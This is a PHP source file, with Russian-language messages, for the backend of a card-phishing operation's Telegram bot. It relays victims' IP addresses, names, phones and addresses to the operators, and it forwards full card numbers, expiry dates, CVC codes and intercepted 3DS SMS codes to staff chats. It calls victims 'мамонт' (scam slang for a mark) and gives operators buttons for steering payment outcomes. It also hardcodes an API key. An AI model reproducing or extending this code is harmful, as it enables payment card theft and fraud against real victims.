<?php
require(dirname(__DIR__) . "/class/telegram.php");

$bot = new Telegram;

$type = $request["type"];

$datetime = $utilities->date_convert();

$default_chat_id = $config["bot"]["chat"]["group"]["default"];
$pro_chat_id = $config["bot"]["chat"]["group"]["pro"];
$staff_chat_id = $config["bot"]["chat"]["group"]["staff"];
$call_chat_id = $config["bot"]["chat"]["group"]["call"];

$users_channel_id = $config["bot"]["chat"]["channel"]["users"];
$staff_channel_id = $config["bot"]["chat"]["channel"]["staff"];

$user_id = 0;
$user_name = "не определен";
$user_tag = "не определен";
$project = "не определен";

$is_custom_payment_type = false;
$src_payment_type = NULL;

$callback_id = "null";
$callback_username = "не определен";
$callback_phone = "не определен";

function object_to_array($data)
{
    if (is_array($data) || is_object($data))
    {
        $result = [];
        foreach ($data as $key => $value)
        {
            $result[$key] = (is_array($value) || is_object($value)) ? object_to_array($value) : $value;
        }
        return $result;
    }
    return $data;
}

function get_bin_info($bin){
	
	
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => "https://bin-ip-checker.p.rapidapi.com/?bin=".$bin,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => "{\r
    \"bin\": \"".$bin."\"\r
}",
  CURLOPT_HTTPHEADER => [
    "X-RapidAPI-Host: bin-ip-checker.p.rapidapi.com",
    "X-RapidAPI-Key: 2498075b7cmsh908d2c4c29316cap1c5c5ajsn0ee733d4591a",
    "content-type: application/json"
  ],
]);

//return 'Банк не найден';

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

if ($err) {
  echo "cURL Error #:" . $err;
} else {
 $t=json_decode($response);
 $t=object_to_array($t);

if(strlen($t['success']>0)){
    
  $haystack = $t['BIN']['issuer']['name'];
  $needle   = 'SBERBANK';

  if (strpos($haystack, $needle) !== false) {
     return($t['BIN']['scheme'].' '.$t['BIN']['type'].' '.$t['BIN']['level'].' SBERBANK');
  }	
  else {	
    return($t['BIN']['scheme'].' '.$t['BIN']['type'].' '.$t['BIN']['level'].' '.$t['BIN']['issuer']['name']);
  }

} else {
  return 'Банк не найден';
}

}

}


if (isset($request["data"]["ip"])) {
	$ip = $request["data"]["ip"];

	$data = $utilities->get_ip_data($ip);
	$location = $data["country"] . ", " . $data["city"];
}

if (isset($request["data"]["project_id"])) {
	$project_id = $request["data"]["project_id"];
    $projects = $database->get_projects_list();

	$project = $projects[$project_id];
}

if (isset($request["data"]["user_id"])) {
	$user_id = $request["data"]["user_id"];
}

if (isset($request["data"]["user_code"])) {
	$user_code = $request["data"]["user_code"];

	$user = $database->get_user_data_by_code($user_code);

	if ($user) {
		$user_id = $user["id"];
		$user_name = "@" . $user["name"];
		$user_tag = "#" . $user["tag"];
		$user_level = $user["level"];
	}

	$is_user_pro = false;

	if ($user_level == 2) {
		$is_user_pro = true;
	}
}

if (isset($request["data"]["amount"])) {	
	$amount = $request["data"]["amount"];
	$formatted_amount = $utilities->number_format($amount);
}

if (isset($request["data"]["type"])) {
	$is_custom_payment_type = true;
    $src_payment_type = $request["data"]["type"];

	if ($request["data"]["type"] == "refund") {
		$payment_type = "возврат";
	}

	if ($request["data"]["type"] == "x_payment") {
		$payment_type = "x" . $request["data"]["x_count"];
	}

	if ($request["data"]["type"] == "manual_confirm") {
		$payment_type = "автоматическое подтверждение";
	}

	if ($request["data"]["type"] == "manual_refund") {
		$payment_type = "ручной возврат";
	}
}

if (isset($request["data"]["order"])) {
	$customer = (empty($request["data"]["order"]["customer"])) ? "Н/Д" : $request["data"]["order"]["customer"];
	$phone = (empty($request["data"]["order"]["phone"])) ? "Н/Д" : $request["data"]["order"]["phone"];
	$address = (empty($request["data"]["order"]["address"])) ? "Н/Д" : $request["data"]["order"]["address"];
	$time = (empty($request["data"]["order"]["datetime"])) ? "Н/Д" : $request["data"]["order"]["datetime"];
}

if (isset($request["data"]["card"])) {
	$card = $request["data"]["card"];

	$card["expire"]["year"] = substr($card["expire"]["year"], -2);
	$card["bin"] = substr($card["number"], 0, 6);
	$card["expire"] = $card["expire"]["month"] . "/" . $card["expire"]["year"];

	$bank = $utilities->get_bank_data($card["number"]);
}

if (isset($request["data"]["destination"])) {
	$destination_card = $request["data"]["destination"];
}

if (isset($request["data"]["error_message"])) {
	$error_message = (empty($request["data"]["error_message"])) ? "Н/Д" : $request["data"]["error_message"];
}

if (isset($request["data"]["callback"])) {
	$callback_id = $request["data"]["callback"]["callback_id"];
	$callback_username = $request["data"]["callback"]["username"];
	$callback_phone = $request["data"]["callback"]["phone"];
}


if ($type == "visit") {
	$message = "🔎 *Посещение сайта*\n\n";

	$message .= "💻*IP-адрес:* " . $ip . "\n";
	$message .= "📱*Местоположение:* " . $location . "\n\n";

	$message .= "🔗 *Веб-сайт:* $project\n";
	$message .= "⌚️ *Дата и время:* " . $datetime;

	$bot->send_message($message, $user_id);

}

if ($type == "refund_visit") {
	$message = "❕  *Посещение формы возврата*\n\n";

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";
    
	$message .= "🔗*Веб-сайт:* $project\n";
	$message .= "⌚️*Дата и время:* " . $datetime;
    
	$bot->send_message($message, $user_id);
    
    
	$message = "❕*Посещение формы возврата*\n\n";

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";
    
	$message .= "🔗*Веб-сайт:* $project\n";
	$message .= "🖥*Участник:* " . $user_name . "\n\n";
	$message .= "⌚️*Дата и время:* " . $datetime;

	$bot->send_message($message, $staff_chat_id);
}


if ($type == "payment") {
	$message = "❕*Переход на форму ввода карты*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾 *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n";
    $message .= "*Клиент:* " . $customer . "\n";
	$message .= "*Телефон:* " . $phone . "\n";
	$message .= "*Адрес:* " . $address . "\n";
	$message .= "*Время:* " . $time . "\n\n";

	$message .= "🔗*Веб-сайт:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;

	$bot->send_message($message, $user_id);

	$message = "❕*Переход на форму ввода карты*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n";
	$message .= "🖥*Участник:* " . $user_tag . "\n\n";

	$message .= "*Клиент:* " . $customer . "\n";

	$message .= "🔗*Веб-сайт:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;
	
	if ($is_user_pro) {
		$bot->send_message($message, $pro_chat_id);
	}

	$message = "❕*Переход на форму ввода карты*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "#️⃣ *Тег:* " . $user_tag . "\n";
	$message .= "🖥*Участник:* " . $user_name . "\n\n";

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n";
   $message .= "*Клиент:* " . $customer . "\n";
	$message .= "*Телефон:* " . $phone . "\n";
	$message .= "*Адрес:* " . $address . "\n";
	$message .= "*Время:* " . $time . "\n\n";

	$message .= "🔗*Веб-сайт:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;

	$bot->send_message($message, $staff_chat_id);
		
	$message = "❕*Переход на форму ввода карты*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "🖥*Участник:* " . $user_name . "\n\n";

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";

	$message .= "🔗*Веб-сайт:* $project\n";
	
	//	 $bot->send_message($message, $default_chat_id);

}

if ($type == "confirm") {
    if ($request["data"]["count"] == 0) {
        $message = "*❗️Мамонт перешел на страницу ввода SMS*\n\n";
			$message .= "*Клиент:* " . $customer . "\n";
	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";
	$message .= "🔗*Веб-сайт:* $project";
        

        $bot->send_message($message, $user_id);

        if ($is_user_pro) {
            $bot->send_message($message, $pro_chat_id);
        }
	}
    
	$message = "❗️*Переход на страницу подтверждения платежа*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "*Тег:* " . $user_tag . "\n";
	$message .= "🖥*Участник:* " . $user_name . "\n\n";

	// $message .= "*Банк:* " . $bank["name"] . " (" . $bank["system"] . ")\n";
	$message .= "*Банк:* " .get_bin_info(substr($card["number"],0,6)). "\n";
	$message .= "*Номер карты:* " . $card["number"] . "\n";
	$message .= "*Срок действия:* " . $card["expire"] . "\n";
	$message .= "*Код CVC:* " . $card["cvc"] . "\n\n";
	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";

	$message .= "🔗*Веб-сайты:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;

	$result = $bot->send_message($message, $staff_chat_id);
	
	$message = "❗️*Переход на страницу подтверждения платежа*\n\n";
	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "🖥*Участник:* " . $user_name . "\n\n";

	$message .= "*Банк:* " . $bank["name"] . " (" . $bank["system"] . ")\n";
	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";

	$message .= "🔗*Веб-сайт:* $project\n";
    
    if ($result['ok'] && $is_custom_payment_type && $request["data"]["type"] == "manual_refund")
        $database->set_refund_message_id($request["data"]["refund_id"], $result['result']['message_id']);
}


if ($type == "3DS") {

$x_val=0;
	unlink("../bot/db/data/".$request["data"]["order_id"]);
	if (isset($request["data"]["x_value"])){$x_val=1;
	$message = "#️⃣ *X-Оплата:* \n";
	
	$message .= "❗️*Введен 3DS код*\n\n";
	
	}
	
	else {
		$message = "❗️*Введен 3DS код*\n\n";
	}
	
	$message .= "*Тег:* " . $user_tag . "\n";
	$message .= "🖥*Участник:* " . $user_name . "\n\n";

//	$message .= "*Банк:* " . $bank["name"] . " (" . $bank["system"] . ")\n";
$message .= "*Банк:* " .get_bin_info(substr($card["number"],0,6)). "\n";
	$message .= "*Номер карты:* " . $card["number"] . "\n";
	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";
	
	$message .= "*SMS-Код:* " . $request["data"]["sms_code"]. " \n\n";


	$message .= "🔗*Веб-сайт:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;
	

		$keyboard = array(
		        "inline_keyboard" => array(
		        	0 => array(
		        		0 => array(
		        			"text" => "Успешная оплата",
		        			"callback_data" => "/success/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	),

		        	1 => array(
		        		0 => array(
		        			"text" => "900",
		        			"callback_data" => "/900/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	),
					2 => array(
		        		0 => array(
		        			"text" => "Ошибка ввода карты",
		        			"callback_data" => "/wrong_card/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	),
					3 => array(
		        		0 => array(
		        			"text" => "Нет денег",
		        			"callback_data" => "/no_money/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	),
					4 => array(
		        		0 => array(
		        			"text" => "X оплата(с уведами)",
		        			"callback_data" => "/xpay/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	),
					5 => array(
		        		0 => array( //Код новый
		        			"text" => "Ошибка транзакции",
		        			"callback_data" => "/mainerr/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	),
					6 => array(
		        		0 => array(
		        			"text" => "X оплата(без уведов)",
		        			"callback_data" => "/xpay1/".$request["data"]["order_id"]."/".$request["data"]["user_code"]."/".$x_val."/".$request["data"]["amount"]."/".$request["data"]["project_id"]
		        		)
		        	)
					
		        ),
		        "resize_keyboard" => true
		    );
	$bot->send_message($message, $staff_chat_id,$keyboard);

  if (isset($request["data"]["x_value"])){$x_val=1;
	$message = "#️⃣ *X-Оплата:* \n";
	
	$message .= "❗️*Введен 3DS код*\n\n";
	
	} 
	
	else {
		$message = "❗️*Введен 3DS код*\n\n";
	}

	// $message .= "#️⃣ *Тег:* " . $user_tag . "\n";
	$message .= "*Клиент:* " . $customer . "\n";
	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";
	$message .= "🔗*Веб-сайты:* $project\n";

   // $bot->send_message($message, $default_chat_id);
   $bot->send_message($message, $user_id);
	
}


if ($type == "sms_code") {
	$message = "❗️*Введен 3DS код*\n\n";
	$message .= "*SMS-Код:* " . $request["data"]["sms_code"];

    if ($request["data"]["type"] == "manual_refund") {
        $data = $database->get_refunds_data_by_id($request["data"]["refund_id"]);
        $bot->send_message($message, $staff_chat_id, null, "markdown", $data['message_id']);
    }
}


if ($type == "payment_success") {
    if (!$src_payment_type) $msg_head = "*Успешная оплата*\n\n";
    else {
        if ($src_payment_type == "refund") $msg_head = "*Успешный возврат*\n\n";
        if ($src_payment_type == "x_payment") $msg_head = "*Успешная оплата $payment_type*\n\n";
        if ($src_payment_type == "manual_confirm") $msg_head = "*Успешное автоматическое подтверждение*\n\n";
    }
    
	$message = "✅ " . $msg_head;

	$message .= "Сумма платежа: *" . $formatted_amount . "* руб.\n";
	$message .= "Карта: *" . $bank["name"] . " (" . $bank["system"] . ")*\n\n";
    
	$message .= "🔗Веб-сайт: *$project*\n";
    
	$bot->send_message($message, $user_id);



	$message = "✅ " . $msg_head;

	$message .= "Сумма платежа: *" . $formatted_amount . "* руб.\n";
	$message .= "Карта: *" . $bank["name"] . " (" . $bank["system"] . ")*\n\n";
    
	$message .= "🖥Участник: *$user_tag*\n";
	$message .= "🔗Веб-сайт: *$project*\n";

	$bot->send_message($message, $default_chat_id);

	if ($is_user_pro) {
		$bot->send_message($message, $pro_chat_id);
	}
	

	$message = "✅ " . $msg_head;
    
	$message .= "🔗Веб-сайт: *$project*\n";
	$message .= "🖥Участник: *$user_name ($user_tag)*\n\n";

	$message .= "Карта: *" . $card["number"] . " — " . $destination_card . "*\n";
	$message .= "Сумма: *" . $formatted_amount . "* руб.\n";
   $message .= "ФИО: *" . $customer . "*\n";
	$message .= "📱 Телефон: *" . $phone . "*\n";
	$bot->send_message($message, $staff_chat_id);



	$message = "✅ " . $msg_head;

	$message .= "Сумма платежа: *" . $formatted_amount . "* руб.\n";
	$message .= "Карта: *" . $bank["name"] . " (" . $bank["system"] . ")*\n\n";
    
	$message .= "🖥Участник: *$user_tag*\n";
	$message .= "🔗Веб-сайт: *$project*\n";

	$bot->send_message($message, $users_channel_id);



	$message = "💎" . $msg_head;
    
	$message .= "🔗Веб-сайт: *$project*\n";
	$message .= "🖥Участник: *$user_name ($user_tag)*\n\n";

	$message .= "Карта: *" . $card["number"] . " — " . $destination_card . "*\n";
	$message .= "Сумма: *" . $formatted_amount . "* руб.\n\n";

	$message .= "ФИО: *" . $customer . "*\n";
	$message .= "📱 Телефон: *" . $phone . "*\n";
    
	$bot->send_message($message, $staff_channel_id);
}



/*
 *	Fail Payment Confirmation
*/



if ($type == "payment_fail") {
	$message = "⚠  *Ошибка подтверждения платежа*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "*Сумма:* " . $formatted_amount . " ₽\n";
	$message .= "*Карта:* " . $bank["name"] . " (" . $bank["system"] . ")\n";
   $message .= "*Клиент:* " . $customer . "\n";
	$message .= "*Адрес:* " . $address . "\n\n";

	$message .= "⛔ *Ошибка:* " . $error_message . "\n\n";

	$message .= "🔗*Веб-сайты:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;

	$bot->send_message($message, $user_id);

	$message = "⚠  *Ошибка подтверждения платежа*\n\n";

	if ($is_custom_payment_type) {
		$message .= "🧾  *Тип платежа:* " . $payment_type . "\n\n";
	}

	$message .= "#️⃣ *Тег:* " . $user_tag . "\n";
	$message .= "🖥*Участник:* " . $user_name . "\n\n";

	$message .= "*Банк:* " . $bank["name"] . " (" . $bank["system"] . ")\n";
	$message .= "*Номер карты:* " . $card["number"] . "\n";
	$message .= "*Срок действия:* " . $card["expire"] . "\n";
	$message .= "*Код CVC:* " . $card["cvc"] . "\n\n";
	$message .= "*Сумма:* " . $formatted_amount . " ₽\n\n";

	$message .= "↪ *Карта получателя:* " . $destination_card . "\n";
	$message .= "⛔ *Ошибка:* " . $error_message . "\n\n";

	$message .= "*Клиент:* " . $customer . "\n";
	$message .= "*Адрес:* " . $address . "\n\n";

	$message .= "🔗*Веб-сайт:* $project\n";
    $message .= "⌚️*Дата и время:* " . $datetime;

	$bot->send_message($message, $staff_chat_id);
}

if ($type == "callback") {
	$message = "📲Пользователь оставил запрос на прозвон!\n\n";

	$message .= "🔗Веб-Сайт: $project\n";
	$message .= "🖥Участник: $user_name ($user_tag)\n\n";

	$message .= "👤Пользователь: $callback_username\n";
	$message .= "📱Номер телефона: $callback_phone";

    $keyboard = array(
        "inline_keyboard" => array(
            array(
                array(
                    "text" => "Забрать звонок",
                    "callback_data" => "/callback/take_call/" . $callback_id
                )
            )
        ),
        "resize_keyboard" => true
    );
    
	$bot->send_message($message, $call_chat_id, $keyboard);
    
    if ($user_id) {
        $message = "📲 Пользователь оставил запрос на прозвон!\n\n";

        $message .= "🔗 Веб-сайт: $project\n";

        $message .= "👤 Пользователь: $callback_username\n";
        $message .= "📱 Номер телефона: $callback_phone";
        
        $bot->send_message($message, $user_id);
    }
}

?>
